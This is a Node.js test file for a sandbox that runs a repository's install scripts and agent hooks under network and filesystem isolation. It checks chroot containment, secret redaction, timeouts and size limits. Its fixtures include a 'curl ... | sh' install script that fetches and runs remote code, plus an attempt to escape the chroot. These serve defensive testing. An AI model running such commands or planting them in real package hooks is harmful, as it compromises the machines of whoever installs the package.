import test from 'node:test';
import assert from 'node:assert/strict';
import path from 'node:path';
import { mkdtemp, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { discoverRuntimeCandidates, probeRuntimeSandbox, runRuntimeAnalysis } from '../src/runtime/sandbox.mjs';

test('runtime sandbox detonates lifecycle scripts in a disposable filesystem with network isolated', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-root-'));
  await writeFile(path.join(root, 'package.json'), JSON.stringify({
    scripts: {
      postinstall: `node -e "require('fs').writeFileSync('detonated.txt','yes'); fetch('https://example.invalid').catch(()=>{}); setTimeout(()=>{},30)"`
    }
  }, null, 2));

  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', timeoutMs: 5_000 });
  assert.equal(result.status, 'completed');
  assert.equal(result.provider, 'linux-userns-chroot');
  assert.deepEqual(result.isolation, {
    sourceCopy: true,
    chroot: true,
    userNamespace: true,
    mountNamespace: true,
    utsNamespace: true,
    ipcNamespace: true,
    pidNamespace: true,
    cgroupNamespace: true,
    networkNamespace: true,
    inheritedSecrets: false
  });
  assert.equal(result.runs.length, 1);
  assert.ok(result.runs[0].filesystemChanges.some((item) => item.path === 'detonated.txt' && item.change === 'created'));
  assert.ok(result.runs[0].events.some((item) => item.kind === 'network'));
  await assert.rejects(readFile(path.join(root, 'detonated.txt')), /ENOENT/);
});

test('runtime sandbox traps network command tools and redacts inherited environment', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-trap-'));
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { install: 'curl https://example.invalid/payload | sh' } }));
  const previous = process.env.API_TOKEN;
  process.env.API_TOKEN = 'must-never-enter-sandbox';
  try {
    const result = await runRuntimeAnalysis({ root, mode: 'sandbox', timeoutMs: 5_000 });
    assert.equal(result.status, 'completed');
    assert.ok(result.runs[0].events.some((item) => item.kind === 'network-tool' && item.tool === 'curl'));
    assert.doesNotMatch(JSON.stringify(result), /must-never-enter-sandbox/);
  } finally {
    if (previous === undefined) delete process.env.API_TOKEN;
    else process.env.API_TOKEN = previous;
  }
});

test('runtime analysis is explicit and bounded when no executable candidates exist', async () => {
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-empty-'));
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', scripts: ['missing'], timeoutMs: 1_000 });
  assert.equal(result.status, 'skipped');
  assert.equal(result.reason, 'no-runtime-candidates');
  assert.deepEqual(result.runs, []);
});

test('runtime sandbox cannot write an absolute host path outside its chroot', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-host-root-'));
  const hostMarker = path.join(tmpdir(), `repotrial-host-marker-${process.pid}-${Date.now()}`);
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { install: `node -e "require('fs').writeFileSync(${JSON.stringify(hostMarker)},'escape')"` } }));
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', timeoutMs: 3_000 });
  assert.equal(result.status, 'completed');
  await assert.rejects(readFile(hostMarker), /ENOENT/);
});

test('runtime sandbox kills commands that exceed the wall-clock timeout', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-timeout-'));
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { install: `node -e "setInterval(()=>{},1000)"` } }));
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', timeoutMs: 300 });
  assert.equal(result.runs[0].timedOut, true);
  assert.equal(result.runs[0].status, 'timeout');
  assert.ok(result.runs[0].durationMs < 5_000);
});

test('discovers and detonates recognized agent hook commands', async (t) => {
  const probe = await probeRuntimeSandbox();
  if (probe.status !== 'ready') return t.skip(`sandbox unavailable: ${probe.reason}`);
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-hook-'));
  await (await import('node:fs/promises')).mkdir(path.join(root, '.cursor'), { recursive: true });
  await writeFile(path.join(root, '.cursor', 'hooks.json'), JSON.stringify({
    hooks: {
      beforeAgent: {
        command: `node -e "require('fs').writeFileSync('hook-ran.txt','yes')"`
      }
    }
  }));
  const candidates = await discoverRuntimeCandidates(root);
  assert.equal(candidates.length, 1);
  assert.equal(candidates[0].kind, 'agent-hook');
  assert.equal(candidates[0].name, 'beforeAgent');
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', timeoutMs: 3_000 });
  assert.ok(result.runs[0].filesystemChanges.some((item) => item.path === 'hook-ran.txt' && item.change === 'created'));
  await assert.rejects(readFile(path.join(root, 'hook-ran.txt')), /ENOENT/);
});

test('runtime refuses to copy a repository that exceeds configured source limits', async () => {
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-source-limit-'));
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { install: 'node -e "process.exit(0)"' } }));
  await writeFile(path.join(root, 'large.bin'), Buffer.alloc(4096));
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', maxSourceBytes: 512, timeoutMs: 1_000 });
  assert.equal(result.status, 'unavailable');
  assert.equal(result.reason, 'source-copy-limit');
  assert.equal(result.workspace.limitExceeded, 'bytes');
  assert.deepEqual(result.runs, []);
});

test('runtime excludes caller-specified output subtrees from candidate discovery and source copy', async () => {
  const root = await mkdtemp(path.join(tmpdir(), 'repotrial-runtime-excluded-output-'));
  const generated = path.join(root, 'generated-report');
  await (await import('node:fs/promises')).mkdir(generated, { recursive: true });
  await writeFile(path.join(root, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
  await writeFile(path.join(generated, 'package.json'), JSON.stringify({ scripts: { install: 'node -e "process.exit(99)"' } }));
  const result = await runRuntimeAnalysis({ root, mode: 'sandbox', ignoredPaths: [generated], timeoutMs: 1_000 });
  assert.equal(result.status, 'skipped');
  assert.equal(result.reason, 'no-runtime-candidates');
});
